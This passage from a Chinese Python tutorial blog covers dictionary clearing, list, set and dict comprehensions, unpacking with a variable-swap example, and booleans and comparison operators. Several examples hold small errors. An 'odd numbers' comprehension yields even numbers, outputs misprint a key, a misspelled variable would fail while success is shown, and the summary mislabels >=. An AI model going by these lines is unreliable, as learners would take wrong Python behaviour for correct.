&#x27;nome&#x27;: &#x27;湖南省长沙市&#x27;&#125;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/Users/poppies/Desktop/字典常见操作.py&quot;, line 7, in &lt;module&gt;</span><br><span class="line">    print(teacher_info)</span><br><span class="line">NameError: name &#x27;teacher_info&#x27; is not defined</span><br></pre></td></tr></table></figure><blockquote><p>clear 清空整个字典元素</p></blockquote><p>示例代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;顾安&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;home&#x27;</span>: <span class="string">&#x27;湖南省长沙市&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(teacher_info)</span><br><span class="line">teacher_info.clear()</span><br><span class="line"><span class="built_in">print</span>(teacher_info)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;顾安&#x27;, &#x27;age&#x27;: 18, &#x27;nome&#x27;: &#x27;湖南省长沙市&#x27;&#125;</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><h1 id="推导式"><a href="#推导式" class="headerlink" title="推导式"></a>推导式</h1><h5 id="引入-4"><a href="#引入-4" class="headerlink" title="引入"></a>引入</h5><p>推导式：就是一种能够快速生成数据的方式</p><p>例如，想要快速生成由1~20内所有奇数数组成的列表，就可以用”推导式”，代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[2, 4, 6, 8, 10, 12, 14, 16, 18, 20]</span><br></pre></td></tr></table></figure><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p>推导式，根据最终要生成的数据，简单划分为</p><ul><li>列表推导式</li><li>集合推导式</li><li>字典推导式</li></ul><p>注意：没有元组推导式，而是生成器（在Python高级进阶课程中在学习）</p><h5 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h5><p>列表推导式：一种可以快速生成列表的方式</p><p>代码格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[变量 <span class="keyword">for</span> 变量 <span class="keyword">in</span> 可迭代对象]</span><br></pre></td></tr></table></figure><p>基本使用：</p><p>案例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: a = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: a</span><br><span class="line">Out[<span class="number">2</span>]: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: a = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: a</span><br><span class="line">Out[<span class="number">4</span>]: [<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: a = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">19</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: a</span><br><span class="line">Out[<span class="number">6</span>]: [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: a = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">19</span>, <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: a</span><br><span class="line">Out[<span class="number">8</span>]: [<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>]</span><br></pre></td></tr></table></figure><p>案例二：列表推导式中用到了 <code>if</code></p><p>注意：列表推导式如果<code>for</code>中用到了<code>if</code>，<code>for</code>不用写<code>:</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">9</span>]: a = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: a</span><br><span class="line">Out[<span class="number">10</span>]: [<span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: a = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>) <span class="keyword">if</span> x % <span class="number">2</span> != <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: a</span><br><span class="line">Out[<span class="number">12</span>]: [<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure><p>案例三：在列表推导式中使用两个 <code>for</code> 循环</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">13</span>]: a = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: a</span><br><span class="line">Out[<span class="number">14</span>]: [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">2</span>), (<span class="number">2</span>, <span class="number">0</span>), (<span class="number">2</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure><p>案例四：在列表推导式中使用三个 <code>for</code> 循环</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">15</span>]: a = [(x, y, z) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: a</span><br><span class="line">Out[<span class="number">16</span>]: </span><br><span class="line">[(<span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>)]</span><br></pre></td></tr></table></figure><h5 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h5><p>请写出一段 Python 代码实现分组：一个 list 里面的元素,比如<code> [1,2,3,...100]</code>变成<code> [[1,2,3],[4,5,6]....]</code></p><p>参考答案：</p><blockquote><p>思考  </p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>)]</span><br><span class="line">b = [a[x:x+<span class="number">3</span>] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a),<span class="number">3</span>)]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h5 id="集合推导式"><a href="#集合推导式" class="headerlink" title="集合推导式"></a>集合推导式</h5><p>集合推导式：一种快速生成集合的方式</p><p>示例代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">5</span>]: a = &#123;x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: <span class="built_in">type</span>(a)</span><br><span class="line">Out[<span class="number">6</span>]: <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: a</span><br><span class="line">Out[<span class="number">7</span>]: &#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">20</span>&#125;</span><br></pre></td></tr></table></figure><p>集合推导式中也可以用<code>if</code>等，与列表推导式在格式上很类似，这里就不做过多的介绍，请类别列表推导式进行学习</p><h5 id="字典推导式"><a href="#字典推导式" class="headerlink" title="字典推导式"></a>字典推导式</h5><p>字典推导式：一种快速生成字典的方式</p><p>案例一：快速生成一个1~10内key为某个数此时value为平方的字典</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;x: x ** <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>)&#125;</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81, 10: 100&#125;</span><br></pre></td></tr></table></figure><p>案例二：快速生成一个1~10内key可以1时value为2，key为2时value3….依次类推的字典</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;x: (x + <span class="number">1</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)&#125;</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;1: 2, 2: 3, 3: 4, 4: 5, 5: 6, 6: 7, 7: 8, 8: 9, 9: 10, 10: 11&#125;</span><br></pre></td></tr></table></figure><h5 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h5><p>编写代码用推导式，实现如下效果（列表中嵌套字典）</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[&#123;1: 1&#125;,</span><br><span class="line"> &#123;2: 4&#125;,</span><br><span class="line"> &#123;3: 9&#125;,</span><br><span class="line"> &#123;4: 16&#125;,</span><br><span class="line"> &#123;5: 25&#125;,</span><br><span class="line"> &#123;6: 36&#125;,</span><br><span class="line"> &#123;7: 49&#125;,</span><br><span class="line"> &#123;8: 64&#125;,</span><br><span class="line"> &#123;9: 81&#125;,</span><br><span class="line"> &#123;10: 100&#125;]</span><br></pre></td></tr></table></figure><p>参考代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[&#123;x: x ** <span class="number">2</span>&#125; <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>)]</span><br></pre></td></tr></table></figure><h1 id="拆包"><a href="#拆包" class="headerlink" title="拆包"></a>拆包</h1><h5 id="引入-5"><a href="#引入-5" class="headerlink" title="引入"></a>引入</h5><p>拆包：是一种快速提取数据的方式</p><p>例如，有一个元组<code>(11, 22, 33, 44)</code>想快速的提取每个元素且赋值给<code>num1, num2, num3, num4</code>这4个变量</p><p>普通的做法，较为繁琐：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = (<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>)  <span class="comment"># 定义一个元组</span></span><br><span class="line">num1 = nums[<span class="number">0</span>]  <span class="comment"># 通过下标来提取</span></span><br><span class="line">num2 = nums[<span class="number">1</span>]  <span class="comment"># 通过下标来提取</span></span><br><span class="line">num3 = nums[<span class="number">2</span>]  <span class="comment"># 通过下标来提取</span></span><br><span class="line">num4 = nums[<span class="number">3</span>]  <span class="comment"># 通过下标来提取</span></span><br></pre></td></tr></table></figure><p>拆包的方式，可以见非常简洁：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1, num2, num3, num4 = (<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>)  <span class="comment"># 一行代码搞定</span></span><br></pre></td></tr></table></figure><h5 id="列表拆包"><a href="#列表拆包" class="headerlink" title="列表拆包"></a>列表拆包</h5><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = [<span class="number">11</span>, <span class="number">22</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">11</span><br><span class="line">22</span><br></pre></td></tr></table></figure><h5 id="元组拆包"><a href="#元组拆包" class="headerlink" title="元组拆包"></a>元组拆包</h5><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = (<span class="number">11</span>, <span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">11</span><br><span class="line">22</span><br></pre></td></tr></table></figure><h5 id="集合拆包"><a href="#集合拆包" class="headerlink" title="集合拆包"></a>集合拆包</h5><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = &#123;<span class="number">11</span>, <span class="number">22</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">11</span><br><span class="line">22</span><br></pre></td></tr></table></figure><h5 id="字典拆包"><a href="#字典拆包" class="headerlink" title="字典拆包"></a>字典拆包</h5><blockquote><p>一般用法</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">name</span><br><span class="line">age</span><br></pre></td></tr></table></figure><p>默认取到的是字典的key，而不是value</p><blockquote><p>常见用法</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> teacher_info.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;k = %s, v = %s&#x27;</span> % (k, v))</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">k = name, v = 顾安</span><br><span class="line">k = age, v = 18</span><br></pre></td></tr></table></figure><h5 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h5><blockquote><p>直接对字典拆包会获取字典中的key，在拆包时需要变量数量与值的数量对等</p><p><code>=</code>右边要拆的数据元素的个数 要 与<code>=</code>左边存的变量个数相同</p></blockquote><p>错误示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ValueError                                Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input-19-887c339c8076&gt; in &lt;module&gt;</span><br><span class="line"><span class="meta prompt_">----&gt; </span><span class="language-bash">1 a, b = [11, 22, 33]</span></span><br><span class="line"></span><br><span class="line">ValueError: too many values to unpack (expected 2)</span><br></pre></td></tr></table></figure><h5 id="经典面试题：交换两个变量的值"><a href="#经典面试题：交换两个变量的值" class="headerlink" title="经典面试题：交换两个变量的值"></a>经典面试题：交换两个变量的值</h5><p>方式一：普通方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">4</span></span><br><span class="line">b = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;交换之前a=%d, b=%d&quot;</span> % (a, b))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 额外定义一个变量，用来临时使用</span></span><br><span class="line">c = a</span><br><span class="line">a = b</span><br><span class="line">b = c</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;交换之后a=%d, b=%d&quot;</span> % (a, b))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">交换之前a=4, b=5</span><br><span class="line">交换之后a=5, b=4</span><br></pre></td></tr></table></figure><p>方式二：巧妙方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">4</span></span><br><span class="line">b = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;交换之前a=%d, b=%d&quot;</span> % (a, b))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 巧妙之处（没有用额外的变量）</span></span><br><span class="line">a = a+b</span><br><span class="line">b = a-b</span><br><span class="line">a = a-b</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;交换之后a=%d, b=%d&quot;</span> % (a, b))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">交换之前a=4, b=5</span><br><span class="line">交换之后a=5, b=4</span><br></pre></td></tr></table></figure><p>方式三：拆包方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">4</span></span><br><span class="line">b = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;交换之前a=%d, b=%d&quot;</span> % (a, b))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python独到之处</span></span><br><span class="line">a, b = b, a  <span class="comment"># </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;交换之后a=%d, b=%d&quot;</span> % (a, b))</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">交换之前a=4, b=5</span><br><span class="line">交换之后a=5, b=4</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><code>a, b = b, a</code>首先要计算<code>=</code>右边<code>b, a</code>此时他们会被当做一个元组即<code>(b, a)</code>就相当于<code>(5, 4)</code></li><li>然后再将<code>a, b = (5, 4)</code>进行计算，此时a为<code>5</code>，b为<code>4</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2. 判断语句和循环语句</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/2.%20%E5%88%A4%E6%96%AD%E8%AF%AD%E5%8F%A5%E5%92%8C%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/2.%20%E5%88%A4%E6%96%AD%E8%AF%AD%E5%8F%A5%E5%92%8C%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>判断语句和循环语句</p><h1 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h1><h2 id="True、False"><a href="#True、False" class="headerlink" title="True、False"></a>True、False</h2><p>Python中的常见数据类型像<code>整形</code>、<code>浮点型</code>、<code>字符串型</code>之前我们都见过了，除了这些类型之外还有一些，本节课我们来看<code>布尔类型</code></p><p>布尔类型只有两种结果</p><ul><li>True</li><li>False</li></ul><p>Ture：表示 ‘真’ ，通俗的说表示 ‘成立’</p><p>False：表示 ‘假’，通俗的说表示 ‘不成立’</p><h5 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h5><p>示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">have_money = <span class="literal">True</span>  <span class="comment"># 定义一个变量存储布尔类型数据True</span></span><br><span class="line">have_friends = <span class="literal">False</span>  <span class="comment"># 定义了一个变量存储布尔类型数据False</span></span><br></pre></td></tr></table></figure><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>因为布尔类型的数据只有2种结果，所以这种数据类型往往用在”判断”的场景。</p><p>简单示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">have_money = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> have_moeny:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你有钱啊，是否有才华就不一定哦...&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;是否有才华不一定，但一定没有钱，^_^...&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">你有钱啊，是否有才华就不一定哦...</span><br></pre></td></tr></table></figure><p>提示：具体的应用会在学习<code>if</code>时会讲解</p><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><h5 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h5><p>如果定义一个变量直接赋值为<code>True</code>或者<code>False</code>这种场景有，但有时我们需要让程序自己计算某个表达式，这个式子的结果是<code>True</code>或者<code>False</code>这样，在配合上<code>if</code>或者<code>while</code>等应用就会显得更加灵活</p><h5 id="比较运算符的分类"><a href="#比较运算符的分类" class="headerlink" title="比较运算符的分类"></a>比较运算符的分类</h5><table><thead><tr><th align="left">比较运算符</th><th align="left">描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>==</code></td><td align="left">检查两个操作数的值是否相等，如果是则条件变为真。</td><td align="left">如<code>a=3,b=3</code>，则<code>a == b </code>为<code> True</code></td></tr><tr><td align="left"><code>!=</code></td><td align="left">检查两个操作数的值是否相等，如果值不相等，则条件变为真。</td><td align="left">如<code>a=1,b=3</code>，则<code>a != b </code>为 <code>True</code></td></tr><tr><td align="left"><code>&gt;</code></td><td align="left">检查左操作数的值是否大于右操作数的值，如果是，则条件成立。</td><td align="left">如<code>a=7,b=3</code>，则<code>a &gt; b </code>为 <code>True</code></td></tr><tr><td align="left"><code>&lt;</code></td><td align="left">检查左操作数的值是否小于右操作数的值，如果是，则条件成立。</td><td align="left">如<code>a=7,b=3</code>，则<code>a &lt; b</code> 为 <code>False</code></td></tr><tr><td align="left"><code>&gt;=</code></td><td align="left">检查左操作数的值是否大于或等于右操作数的值，如果是，则条件成立。</td><td align="left">如<code>a=3,b=3</code>，则<code>a &gt;= b</code>为 <code>True</code></td></tr><tr><td align="left"><code>&lt;=</code></td><td align="left">检查左操作数的值是否小于或等于右操作数的值，如果是，则条件成立。</td><td align="left">如<code>a=3,b=3</code>，则<code>a &lt;= b</code>为 <code>True</code></td></tr></tbody></table><h5 id="比较运算符的结果"><a href="#比较运算符的结果" class="headerlink" title="比较运算符的结果"></a>比较运算符的结果</h5><p>比较运算符的结果一定是<code>True</code>或者<code>False</code></p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span> &gt; <span class="number">50</span>  <span class="comment"># 结果就是True</span></span><br><span class="line"><span class="number">100</span> &lt; <span class="number">50</span>  <span class="comment"># 结果就是False</span></span><br></pre></td></tr></table></figure><h5 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h5><p>用Python交互模式的示例代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment">## 比较运算符</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># == 等于：表示左右两个操作数是否相等，如果相等则整个表达式的值为 True；不相等则为False</span></span><br><span class="line"><span class="meta">... </span>num1 = <span class="number">15</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num2 = <span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(num1 == num2)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># != 不等于</span></span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(num1 != num2)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># &gt; 大于</span></span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(num1 &gt; num2)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># &lt; 小于</span></span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(num1 &lt; num2)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># &gt;= 大于等于: num1 大于 或者 等于 num2 ，条件都成立</span></span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(num1 &gt;= num2)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># &lt;= 小于等于： num1 小于 或者 等于 num2 ，条件都成立</span></span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(num1 &lt;= num2)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> num1 &gt;= num2:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">&quot;条件成立！&quot;</span>)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li>把生活中的大于、小于、等于、不等于、大于或者等于、小于或者等于用<code>&gt;</code>、<code>&lt;</code>、<code>==</code>、<code>!=</code>、<code>&gt;=</code>、<code>&lt;=</code>来表示</li><li><code>&gt;=</code>表示的意思是：小于或者等于 只要满足那么结果就是<code>True</code>否则为<code>False</code></li><li><code>&lt;=</code>表示的意思是：小于或者等于 只要满足那么结果就是<code>True</code>否则为<code>False</code></li><li>注意等于用<code>==</code>表示，而不是<code>=</code></li></ul><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><blockquote><p><a href="https://www.cnblogs.com/baicai37/p/12345057.html">Python中not、and、or的优先级</a></p></blockquote><h5 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h5><p>通过比较运算符我们知道，当比较数据大小、是否相等时，可以直接用<code>&gt;</code>、<code>&lt;</code>、<code>==</code>、<code>!=</code>、<code>&gt;=</code>、<code>&lt;=</code>来操作</p><p>但是，有很多时候不仅仅是简单的对比大小还有：<code>并且</code>、<code>或者</code>、<code>不</code></p><p>举个例子：</p><ul><li>成年<code>并且</code>女性</li><li>本科生<code>或者</code>研究生</li><li><code>不</code>是18周岁以下学生</li></ul><p>为了能够实现<code>并且</code>、<code>或者</code>、<code>不</code>，Python提供了逻辑运算符</p><ul><li><code>and</code>实现<code>并且</code>的功能</li><li><code>or</code>实现<code>或者</code>的功能</li><li><code>not</code>实现<code>不</code>的功能</li></ul><figure class="highlight text"><table><tr><td 